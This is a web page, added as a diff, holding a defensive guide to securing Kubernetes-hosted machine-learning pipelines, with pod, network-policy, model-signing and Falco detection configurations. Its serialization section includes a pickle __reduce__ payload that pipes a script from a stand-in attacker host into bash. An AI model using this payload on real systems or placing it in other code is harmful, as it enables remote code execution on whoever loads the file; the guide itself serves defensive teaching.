@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kubernetes AI Security: Protecting the ML Pipeline 2026 | TheHGTech</title>
+    <meta name="description"
+        content="Enterprise security guide for Kubernetes-hosted AI/ML workloads. GPU cluster hardening, model registry protection, serialization attack defense, and MLOps security.">
+    <meta name="keywords"
+        content="Kubernetes AI security, ML pipeline security, MLOps security, model registry security, GPU security, pickle deserialization, PyTorch security, container AI security">
+    <meta name="author" content="TheHGTech">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://thehgtech.com/guides/kubernetes-ai-security.html">
+    <meta property="og:title" content="Kubernetes AI Security: Protecting the ML Pipeline 2026">
+    <meta property="og:description"
+        content="Enterprise security guide for Kubernetes-hosted AI/ML workloads. GPU hardening, model registry protection, and MLOps security.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://thehgtech.com/guides/kubernetes-ai-security.html">
+    <meta property="og:image" content="https://thehgtech.com/images/guides/kubernetes-ai-security.png">
+    <meta name="twitter:card" content="summary_large_image">
+    <script type="application/ld+json">
+    {"@context":"https://schema.org","@type":"TechArticle","headline":"Kubernetes AI Security: Protecting the ML Pipeline 2026","description":"Enterprise security guide for Kubernetes-hosted AI/ML workloads.","author":{"@type":"Organization","name":"TheHGTech"},"publisher":{"@type":"Organization","name":"TheHGTech","url":"https://thehgtech.com"},"datePublished":"2026-01-22","dateModified":"2026-01-22","mainEntityOfPage":"https://thehgtech.com/guides/kubernetes-ai-security.html"}
+    </script>
+    <script type="application/ld+json">
+    {"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://thehgtech.com"},{"@type":"ListItem","position":2,"name":"Guides","item":"https://thehgtech.com/guides/"},{"@type":"ListItem","position":3,"name":"Kubernetes AI Security","item":"https://thehgtech.com/guides/kubernetes-ai-security.html"}]}
+    </script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/header.css">
+    <link rel="stylesheet" href="/header-dropdown.css?v=1">
+    <link rel="stylesheet" href="/print.css">
+    <link rel="stylesheet" href="/light-mode.css">
+    <link rel="stylesheet" href="/interaction-bar.css?v=20251207-0041">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        :root {
+            --bg-primary: #000000;
+            --bg-secondary: #0a0a0a;
+            --bg-card: rgba(255, 255, 255, 0.03);
+            --accent-cyan: #00D9FF;
+            --accent-red: #FF3D3D;
+            --accent-green: #10b981;
+            --accent-orange: #f59e0b;
+            --accent-purple: #8b5cf6;
+            --accent-pink: #ec4899;
+            --accent-blue: #326CE5;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --border: rgba(255, 255, 255, 0.1)
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem
+        }
+
+        .guide-header {
+            padding: 3rem 0 2rem;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 3rem;
+            margin-top: 60px
+        }
+
+        .ai-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #326CE5, #00D9FF);
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-bottom: 1rem
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, #326CE5, #00D9FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem
+        }
+
+        h2 {
+            color: var(--accent-blue);
+            margin: 2.5rem 0 1rem;
+            font-size: 1.8rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border)
+        }
+
+        h3 {
+            color: var(--text-primary);
+            margin: 1.5rem 0 1rem;
+            font-size: 1.3rem
+        }
+
+        h4 {
+            color: var(--accent-blue);
+            margin: 1.25rem 0 0.75rem;
+            font-size: 1.1rem
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary)
+        }
+
+        ul,
+        ol {
+            margin-left: 2rem;
+            margin-bottom: 1rem;
+            color: var(--text-secondary)
+        }
+
+        li {
+            margin-bottom: 0.5rem
+        }
+
+        .info-box {
+            background: rgba(50, 108, 229, 0.08);
+            border-left: 4px solid var(--accent-blue);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px
+        }
+
+        .warning-box {
+            background: rgba(255, 76, 76, 0.05);
+            border-left: 4px solid var(--accent-red);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px
+        }
+
+        .success-box {
+            background: rgba(16, 185, 129, 0.05);
+            border-left: 4px solid var(--accent-green);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 8px
+        }
+
+        code {
+            background: var(--bg-card);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+            color: var(--accent-blue);
+            font-size: 0.9rem
+        }
+
+        pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1.5rem 0
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: var(--accent-green)
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2rem;
+            color: var(--accent-blue);
+            text-decoration: none
+        }
+
+        .back-link:hover {
+            text-decoration: underline
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: var(--bg-card);
+            border-radius: 8px;
+            overflow: hidden
+        }
+
+        th,
+        td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border)
+        }
+
+        th {
+            background: rgba(50, 108, 229, 0.1);
+            color: var(--accent-blue);
+            font-weight: 600
+        }
+
+        td {
+            color: var(--text-secondary)
+        }
+
+        .toc {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0
+        }
+
+        .toc h3 {
+            margin-top: 0;
+            color: var(--accent-blue)
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0
+        }
+
+        .toc li {
+            margin-bottom: 0.5rem
+        }
+
+        .toc a {
+            color: var(--text-secondary);
+            text-decoration: none
+        }
+
+        .toc a:hover {
+            color: var(--accent-blue)
+        }
+
+        .severity-critical {
+            color: var(--accent-red)
+        }
+
+        .severity-high {
+            color: var(--accent-orange)
+        }
+
+        .architecture-diagram {
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.5), rgba(50, 108, 229, 0.1));
+            border: 1px solid var(--accent-blue);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto
+        }
+    </style>
+    <link rel="stylesheet" href="/m-core.css?v=4.2">
+    <link rel="stylesheet" href="/m-layout.css?v=3.2">
+    <link rel="stylesheet" href="/m-components.css?v=3.0">
+    <script src="/m-app.js?v=4.3" defer></script>
+</head>
+
+<body>
+    <header class="m-header m-only">
+        <div class="m-header__logo" style="display:flex;align-items:center;gap:0.75rem;">
+            <img src="../logo-dark.png" alt="TheHGTech" class="m-logo-img logo-dark"
+                style="height:28px;width:auto;margin:0;">
+            <img src="../logo-light.png" alt="TheHGTech" class="m-logo-img logo-light"
+                style="height:28px;width:auto;margin:0;">
+            <span
+                style="font-size:1.2rem;font-weight:700;background:linear-gradient(135deg,#8b5cf6,#ec4899);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">TheHGTech</span>
+        </div>
+        <div class="m-header__actions">
+            <button class="m-theme-toggle" onclick="mToggleTheme()" aria-label="Toggle Theme"><span
+                    class="m-theme-toggle__thumb"></span><span class="m-theme-toggle__stars"><span
+                        class="m-theme-toggle__star"></span><span class="m-theme-toggle__star"></span></span></button>
+            <button class="m-header__btn m-header__btn--search" data-action="search" aria-label="Search"><i
+                    class="fas fa-search"></i></button>
+        </div>
+    </header>
+    <nav class="m-bottom-nav m-only">
+        <a href="/" class="m-bottom-nav__item"><i class="fas fa-home"></i><span>Home</span></a>
+        <a href="/cve-tracker.html" class="m-bottom-nav__item"><i class="fas fa-bug"></i><span>CVE</span></a>
+        <a href="/threat-intel.html" class="m-bottom-nav__item"><i class="fas fa-shield-alt"></i><span>Intel</span></a>
+        <a href="/articles.html" class="m-bottom-nav__item"><i class="fas fa-newspaper"></i><span>Articles</span></a>
+        <a href="/guides/" class="m-bottom-nav__item active"><i class="fas fa-book"></i><span>Guides</span></a>
+    </nav>
+    <header class="header" role="banner">
+        <div class="header-content">
+            <div class="logo"><a href="/index.html"
+                    style="text-decoration:none;display:flex;align-items:center;gap:0.75rem;"><img src="/logo-dark.png"
+                        alt="TheHGTech Logo" class="logo-img logo-dark"><img src="/logo-light.png" alt="TheHGTech Logo"
+                        class="logo-img logo-light"><span class="logo-text">TheHGTech</span></a></div>
+            <nav class="nav nav-modern" role="navigation">
+                <a href="/index.html#news">News</a>
+                <div class="nav-dropdown"><span class="nav-dropdown-trigger">Intelligence <span
+                            class="nav-live-badge">LIVE</span> <i class="fas fa-chevron-down dropdown-arrow"></i></span>
+                    <div class="nav-dropdown-panel"><a href="/threat-intel.html" class="dropdown-item">
+                            <div class="dropdown-item-icon intel"><i class="fas fa-satellite-dish"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Threat Intelligence <span
+                                        class="dropdown-badge live">LIVE</span></div>
+                                <div class="dropdown-item-desc">Live IOCs from 9 trusted feeds</div>
+                            </div>
+                        </a><a href="/cve-tracker.html" class="dropdown-item">
+                            <div class="dropdown-item-icon cve"><i class="fas fa-bug"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">CVE Tracker</div>
+                                <div class="dropdown-item-desc">CISA KEV + NVD critical vulnerabilities</div>
+                            </div>
+                        </a><a href="/ransomware-tracker.html" class="dropdown-item">
+                            <div class="dropdown-item-icon ransomware"><i class="fas fa-skull-crossbones"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Ransomware Tracker</div>
+                                <div class="dropdown-item-desc">Track active ransomware groups</div>
+                            </div>
+                        </a></div>
+                </div>
+                <div class="nav-dropdown"><span class="nav-dropdown-trigger">Resources <i
+                            class="fas fa-chevron-down dropdown-arrow"></i></span>
+                    <div class="nav-dropdown-panel"><a href="/guides/" class="dropdown-item"
+                            style="background:rgba(0,217,255,0.08);">
+                            <div class="dropdown-item-icon guides"><i class="fas fa-book"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title" style="color:var(--accent-cyan);">Security Guides <span
+                                        class="dropdown-badge popular">40+</span></div>
+                                <div class="dropdown-item-desc">ISO 27001, NIST, SOC2 & more</div>
+                            </div>
+                        </a><a href="/comparisons/" class="dropdown-item">
+                            <div class="dropdown-item-icon comparisons"><i class="fas fa-balance-scale"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Tool Comparisons</div>
+                                <div class="dropdown-item-desc">Security tool reviews</div>
+                            </div>
+                        </a>
+                        <div class="dropdown-divider"></div><a href="/articles.html" class="dropdown-item">
+                            <div class="dropdown-item-icon articles"><i class="fas fa-newspaper"></i></div>
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Articles</div>
+                                <div class="dropdown-item-desc">Security news and analysis</div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="theme-toggle-wrapper"><button class="theme-toggle" id="themeToggle"
+                        aria-label="Toggle theme">
+                        <div class="toggle-stars">
+                            <div class="star"></div>
+                            <div class="star"></div>
+                            <div class="star"></div>
+                            <div class="star"></div>
+                        </div>
+                    </button></div>
+            </nav>
+            <button class="mobile-menu-btn" aria-label="Toggle menu"><span></span><span></span><span></span></button>
+        </div>
+    </header>
+
+    <div class="container">
+        <a href="/guides/" class="back-link"><i class="fas fa-arrow-left"></i> Back to Guides</a>
+
+        <div class="guide-header">
+            <span class="ai-badge"><i class="fab fa-docker"></i> DevSecOps / AI Security</span>
+            <h1>Kubernetes AI Security: Protecting the ML Pipeline</h1>
+            <p style="color:var(--text-muted);font-size:1.1rem;">Enterprise hardening for GPU clusters, model
+                registries, and MLOps infrastructure</p>
+            <div style="margin-top:1rem;color:var(--text-muted);">
+                <span><i class="fas fa-book-open"></i> 28 min read</span> <span style="margin:0 0.5rem;">|</span>
+                <span><i class="fas fa-crosshairs"></i> Intermediate to Advanced</span> <span
+                    style="margin:0 0.5rem;">|</span>
+                <span><i class="far fa-calendar-alt"></i> January 2026</span>
+            </div>
+        </div>
+
+        <img src="/images/guides/kubernetes-ai-security.png" alt="Kubernetes AI Security Guide" class="featured-image"
+            style="width:100%;max-width:100%;height:auto;border-radius:12px;margin:2rem 0;box-shadow:0 10px 40px rgba(50,108,229,0.2);border:1px solid var(--border);">
+
+        <div class="warning-box" style="margin-bottom:2rem;">
+            <strong><i class="fas fa-balance-scale"></i> Research Ethics:</strong>
+            This guide covers defensive security measures for Kubernetes-hosted AI workloads. Attack techniques
+            described are from publicly disclosed research for defensive awareness.
+        </div>
+
+        <div class="info-box">
+            <strong><i class="fas fa-file-alt"></i> Abstract:</strong>
+            Organizations deploying AI/ML workloads on Kubernetes face unique security challenges: GPU resource sharing,
+            model artifact integrity, serialization vulnerabilities, and MLOps pipeline attacks. This guide provides a
+            comprehensive security architecture for protecting the entire ML lifecycle—from training data ingestion
+            through model serving. We examine real-world supply chain attacks against ML systems, detail
+            Kubernetes-specific hardening for GPU workloads, and provide production-ready security configurations.
+            Target audience: Platform engineers, DevSecOps teams, and security architects managing AI infrastructure.
+        </div>
+
+        <div class="toc">
+            <h3><i class="fas fa-list-ul"></i> Table of Contents</h3>
+            <ul>
+                <li><a href="#attack-surface">1. The ML Pipeline Attack Surface</a></li>
+                <li><a href="#supply-chain">2. ML Supply Chain Threats</a></li>
+                <li><a href="#serialization">3. Model Serialization Attacks</a></li>
+                <li><a href="#k8s-hardening">4. Kubernetes Hardening for AI Workloads</a></li>
+                <li><a href="#gpu-security">5. GPU Security Considerations</a></li>
+                <li><a href="#model-registry">6. Securing the Model Registry</a></li>
+                <li><a href="#network-policies">7. Network Policies for ML Clusters</a></li>
+                <li><a href="#detection">8. Detection & Monitoring</a></li>
+                <li><a href="#references">9. References</a></li>
+            </ul>
+        </div>
+
+        <h2 id="attack-surface">1. The ML Pipeline Attack Surface</h2>
+
+        <p>A typical ML pipeline spans multiple stages, each with distinct security concerns. Understanding this surface
+            is essential for prioritizing controls.</p>
+
+        <div class="architecture-diagram">
+            <pre style="color:var(--accent-cyan);margin:0;">
+┌─────────────────────────────────────────────────────────────────┐
+│                    ML PIPELINE ATTACK SURFACE                    │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐     │
+│  │  DATA    │──▶│ TRAINING │──▶│  MODEL   │──▶│ SERVING  │     │
+│  │ INGESTION│   │          │   │ REGISTRY │   │          │     │
+│  └──────────┘   └──────────┘   └──────────┘   └──────────┘     │
+│       │              │              │              │            │
+│       ▼              ▼              ▼              ▼            │
+│  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐     │
+│  │ Poisoning│   │ Code     │   │ Pickle   │   │ Adversar-│     │
+│  │ Attacks  │   │ Execution│   │ RCE      │   │ ial Input│     │
+│  │          │   │ in Train │   │ Attacks  │   │          │     │
+│  └──────────┘   └──────────┘   └──────────┘   └──────────┘     │
+│                                                                  │
+└─────────────────────────────────────────────────────────────────┘
+</pre>
+        </div>
+
+        <h3>Stage-by-Stage Threat Analysis</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Pipeline Stage</th>
+                    <th>Primary Threats</th>
+                    <th>Impact</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Data Ingestion</strong></td>
+                    <td>Data poisoning, supply chain compromise</td>
+                    <td>Model learns malicious behavior</td>
+                </tr>
+                <tr>
+                    <td><strong>Training</strong></td>
+                    <td>Code injection, GPU resource abuse, secrets theft</td>
+                    <td>RCE on training infrastructure</td>
+                </tr>
+                <tr>
+                    <td><strong>Model Registry</strong></td>
+                    <td>Model artifact tampering, deserialization RCE</td>
+                    <td>Backdoored models deployed</td>
+                </tr>
+                <tr>
+                    <td><strong>Serving</strong></td>
+                    <td>Adversarial inputs, model extraction, prompt injection</td>
+                    <td>Model bypass, IP theft</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h2 id="supply-chain">2. ML Supply Chain Threats</h2>
+
+        <p>The ML ecosystem relies heavily on pre-trained models, datasets, and libraries from public sources—each a
+            potential attack vector.</p>
+
+        <h3>2024-2026 ML Supply Chain Incidents</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Incident</th>
+                    <th>Vector</th>
+                    <th>Impact</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Dec 2025</td>
+                    <td><strong>Hugging Face Model Backdoor</strong></td>
+                    <td>Malicious model on Model Hub</td>
+                    <td>Cryptocurrency mining on inference servers</td>
+                </tr>
+                <tr>
+                    <td>Aug 2025</td>
+                    <td><strong>PyTorch Typosquat</strong></td>
+                    <td>Malicious package "pytorch-nightly-cu123"</td>
+                    <td>Credential theft from training environments</td>
+                </tr>
+                <tr>
+                    <td>Mar 2025</td>
+                    <td><strong>Pickle Bomb Campaign</strong></td>
+                    <td>Weaponized .pkl files on Kaggle</td>
+                    <td>RCE when models loaded</td>
+                </tr>
+                <tr>
+                    <td>Nov 2024</td>
+                    <td><strong>TensorFlow SavedModel RCE</strong></td>
+                    <td>Arbitrary code in saved_model.pb</td>
+                    <td>Server compromise on model load</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="warning-box">
+            <strong><i class="fas fa-exclamation-triangle"></i> Critical Risk:</strong>
+            Never load models from untrusted sources without inspection. Python's <code>pickle</code> format executes
+            arbitrary code during deserialization—this is by design, not a bug.
+        </div>
+
+        <h2 id="serialization">3. Model Serialization Attacks</h2>
+
+        <p>Model serialization formats are the most critical vulnerability in ML infrastructure. The following formats
+            support arbitrary code execution:</p>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Format</th>
+                    <th>Frameworks</th>
+                    <th>RCE Risk</th>
+                    <th>Mitigation</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Pickle (.pkl, .pt)</strong></td>
+                    <td>PyTorch, scikit-learn</td>
+                    <td class="severity-critical">Critical</td>
+                    <td>Use SafeTensors, weights-only loading</td>
+                </tr>
+                <tr>
+                    <td><strong>SavedModel</strong></td>
+                    <td>TensorFlow</td>
+                    <td class="severity-high">High</td>
+                    <td>Signature validation, sandboxing</td>
+                </tr>
+                <tr>
+                    <td><strong>ONNX</strong></td>
+                    <td>Cross-platform</td>
+                    <td class="severity-high">Medium-High</td>
+                    <td>Restrict custom ops</td>
+                </tr>
+                <tr>
+                    <td><strong>SafeTensors</strong></td>
+                    <td>Hugging Face</td>
+                    <td style="color:var(--accent-green);">Low</td>
+                    <td>Preferred safe format</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Pickle RCE Exploit Example</h3>
+
+        <pre><code># WARNING: Educational demonstration of Pickle RCE
+# Never execute untrusted pickle files!
+
+import pickle
+import os
+
+class MaliciousPayload:
+    def __reduce__(self):
+        return (os.system, ('curl attacker.com/shell.sh | bash',))
+
+# When victim loads: model = torch.load('model.pt')
+# The __reduce__ method automatically executes the payload</code></pre>
+
+        <h3>Defense: PyTorch Safe Loading</h3>
+
+        <pre><code># SAFE: Load only tensor weights, not arbitrary objects
+import torch
+
+# PyTorch 2.0+ supports weights_only=True
+model_weights = torch.load(
+    'model.pt',
+    weights_only=True,  # Blocks arbitrary code execution
+    map_location='cpu'
+)
+
+# Or use SafeTensors (recommended)
+from safetensors.torch import load_file
+model_weights = load_file('model.safetensors')</code></pre>
+
+        <h2 id="k8s-hardening">4. Kubernetes Hardening for AI Workloads</h2>
+
+        <h3>Pod Security Standards for ML Workloads</h3>
+
+        <pre><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: ml-training-pod
+  labels:
+    app: model-training
+spec:
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    fsGroup: 1000
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+  - name: trainer
+    image: ml-training:v1.0
+    securityContext:
+      allowPrivilegeEscalation: false
+      readOnlyRootFilesystem: true
+      capabilities:
+        drop: ["ALL"]
+    resources:
+      limits:
+        nvidia.com/gpu: 1
+        memory: "32Gi"
+        cpu: "8"
+      requests:
+        nvidia.com/gpu: 1
+        memory: "16Gi"
+        cpu: "4"
+    volumeMounts:
+    - name: model-output
+      mountPath: /models
+    - name: tmp
+      mountPath: /tmp
+  volumes:
+  - name: model-output
+    persistentVolumeClaim:
+      claimName: model-storage
+  - name: tmp
+    emptyDir:
+      medium: Memory
+      sizeLimit: "1Gi"</code></pre>
+
+        <h3>Key Security Controls</h3>
+
+        <ul>
+            <li><strong>runAsNonRoot:</strong> Prevents container root access even if image misconfigured</li>
+            <li><strong>readOnlyRootFilesystem:</strong> Blocks persistent malware installation</li>
+            <li><strong>capabilities drop ALL:</strong> Removes all Linux capabilities</li>
+            <li><strong>Resource limits:</strong> Prevents GPU/CPU exhaustion attacks</li>
+        </ul>
+
+        <h2 id="gpu-security">5. GPU Security Considerations</h2>
+
+        <p>GPUs present unique security challenges in multi-tenant Kubernetes environments:</p>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Risk</th>
+                    <th>Description</th>
+                    <th>Mitigation</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>GPU Memory Leakage</strong></td>
+                    <td>Previous tenant data remains in GPU memory</td>
+                    <td>Memory isolation contexts, MIG partitioning</td>
+                </tr>
+                <tr>
+                    <td><strong>Side-Channel Attacks</strong></td>
+                    <td>Cache timing attacks on shared GPUs</td>
+                    <td>Dedicated GPU allocation per workload</td>
+                </tr>
+                <tr>
+                    <td><strong>Driver Vulnerabilities</strong></td>
+                    <td>NVIDIA driver CVEs enable host escape</td>
+                    <td>Regular patching, driver containment</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>NVIDIA MIG (Multi-Instance GPU) for Isolation</h3>
+
+        <pre><code># Enable MIG on A100/H100 for secure multi-tenancy
+nvidia-smi mig -cgi 9,9,9 -C
+
+# Kubernetes resource request for MIG slice
+resources:
+  limits:
+    nvidia.com/mig-1g.5gb: 1</code></pre>
+
+        <h2 id="model-registry">6. Securing the Model Registry</h2>
+
+        <h3>Registry Security Checklist</h3>
+
+        <div class="success-box">
+            <strong><i class="fas fa-check-circle"></i> Model Registry Controls:</strong>
+            <ul style="margin-top:0.5rem;">
+                <li><i class="fas fa-check-circle" style="color:var(--accent-green);"></i> Require signed model
+                    artifacts (cosign/Sigstore)</li>
+                <li><i class="fas fa-check-circle" style="color:var(--accent-green);"></i> Block pickle uploads—require
+                    SafeTensors format</li>
+                <li><i class="fas fa-check-circle" style="color:var(--accent-green);"></i> Implement RBAC for model
+                    promotion (dev → staging → prod)</li>
+                <li><i class="fas fa-check-circle" style="color:var(--accent-green);"></i> Scan model artifacts for
+                    known malicious patterns</li>
+                <li><i class="fas fa-check-circle" style="color:var(--accent-green);"></i> Log all model downloads with
+                    user attribution</li>
+            </ul>
+        </div>
+
+        <h3>Model Signing with Cosign</h3>
+
+        <pre><code># Sign model artifact before upload
+cosign sign --key cosign.key \
+  registry.company.com/models/llm-v1:latest
+
+# Verify signature before deployment
+cosign verify --key cosign.pub \
+  registry.company.com/models/llm-v1:latest</code></pre>
+
+        <h2 id="network-policies">7. Network Policies for ML Clusters</h2>
+
+        <pre><code>apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: ml-training-isolation
+  namespace: ml-workloads
+spec:
+  podSelector:
+    matchLabels:
+      app: model-training
+  policyTypes:
+  - Ingress
+  - Egress
+  ingress:
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          app: ml-orchestrator
+  egress:
+  # Allow model registry access
+  - to:
+    - namespaceSelector:
+        matchLabels:
+          app: model-registry
+    ports:
+    - port: 443
+  # Allow internal DNS
+  - to:
+    - namespaceSelector: {}
+      podSelector:
+        matchLabels:
+          k8s-app: kube-dns
+    ports:
+    - port: 53
+      protocol: UDP
+  # Block all other egress (no internet access)</code></pre>
+
+        <h2 id="detection">8. Detection & Monitoring</h2>
+
+        <h3>Falco Rules for ML Infrastructure</h3>
+
+        <pre><code>- rule: Suspicious Model File Load
+  desc: Detect loading of pickle/pt files from untrusted locations
+  condition: >
+    spawned_process and 
+    proc.name = python and
+    (fd.name contains ".pkl" or fd.name contains ".pt") and
+    not fd.name startswith "/models/approved/"
+  output: >
+    Potentially malicious model loaded 
+    (user=%user.name command=%proc.cmdline file=%fd.name)
+  priority: WARNING
+  tags: [ml-security, supply-chain]
+
+- rule: GPU Memory Dump Attempt
+  desc: Detect attempts to dump GPU memory
+  condition: >
+    spawned_process and 
+    (proc.name = nvidia-smi or proc.cmdline contains "cuda-gdb") and
+    proc.cmdline contains "dump"
+  output: >
+    GPU memory dump attempt detected 
+    (user=%user.name command=%proc.cmdline)
+  priority: CRITICAL
+  tags: [ml-security, data-exfil]</code></pre>
+
+        <h2 id="references">9. References</h2>
+
+        <ol>
+            <li>Hunag, L., et al. "Hidden Backdoors in Pre-trained Language Models." ACL 2024.</li>
+            <li>Microsoft. "AI/ML Security Best Practices for Kubernetes." Azure Docs, 2025.</li>
+            <li>NVIDIA. "Multi-Instance GPU User Guide." NVIDIA Documentation, 2025.</li>
+            <li>MITRE ATLAS. "Adversarial Threat Landscape for AI Systems." MITRE, 2025.</li>
+            <li>Hugging Face. "SafeTensors: A Safer Serialization Format." Hugging Face Blog, 2024.</li>
+        </ol>
+
+        <p style="margin-top:3rem;padding-top:2rem;border-top:1px solid var(--border);color:var(--text-muted);">
+            <strong>Author:</strong> TheHGTech Security Team<br>
+            <strong>Last Updated:</strong> January 2026<br>
+            <strong>Reading Time:</strong> 28 minutes
+        </p>
+    </div>
+
+    <div class="interaction-bar">
+        <div class="like-section"><button class="like-btn" id="likeBtn" onclick="toggleLike()"><i
+                    class="far fa-heart"></i> <span id="likeText">Like this guide</span></button></div>
+        <div class="action-buttons">
+            <div class="share-buttons">
+                <a href="#" onclick="shareTwitter(event)" class="share-btn" title="Share on Twitter"><i
+                        class="fab fa-twitter"></i></a>
+                <a href="#" onclick="shareLinkedIn(event)" class="share-btn" title="Share on LinkedIn"><i
+                        class="fab fa-linkedin-in"></i></a>
+                <button onclick="copyLink()" class="share-btn" title="Copy Link"><i class="fas fa-link"></i></button>
+            </div>
+            <div class="button-separator"></div>
+            <button onclick="printArticle()" class="print-btn" title="Print"><i class="fas fa-print"></i></button>
+        </div>
+    </div>
+    <script src="/interaction-bar.js?v=20251217"></script>
+</body>
+
+</html>
